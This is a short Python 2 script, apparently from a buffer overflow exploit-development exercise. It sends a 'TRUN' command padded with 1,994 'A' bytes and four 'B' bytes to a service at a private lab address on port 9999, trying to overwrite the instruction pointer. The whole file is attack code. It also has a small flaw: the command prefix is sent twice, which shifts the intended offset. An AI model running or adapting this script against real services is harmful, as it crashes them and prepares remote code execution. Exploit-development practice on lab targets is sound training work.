#! /usr/bin/python2
import socket;
import sys;

ip="10.0.2.11"
port = 9999 #default TRUN port
prefix = 'TRUN /.:/'

offset = "A" * 1994
eip = "B" * 4

buffer = prefix + offset + eip

print("Fuzzing TRUN with %s bytes " % len(buffer))
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
connect = s.connect((ip,port))
s.send((prefix + buffer))
s.close()
